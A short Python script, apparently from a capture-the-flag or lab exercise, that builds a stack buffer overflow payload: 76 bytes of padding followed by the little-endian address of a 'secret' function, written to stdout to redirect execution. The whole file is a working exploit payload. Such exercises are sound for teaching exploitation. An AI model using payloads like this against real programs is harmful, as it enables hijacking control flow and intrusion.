import sys

secret_func_address = b'\x9d\x61\x55\x56'  # Address of the 'secret' function in little-endian format
payload = b'A' * 76 + secret_func_address  # 76 = Offset

sys.stdout.buffer.write(payload)
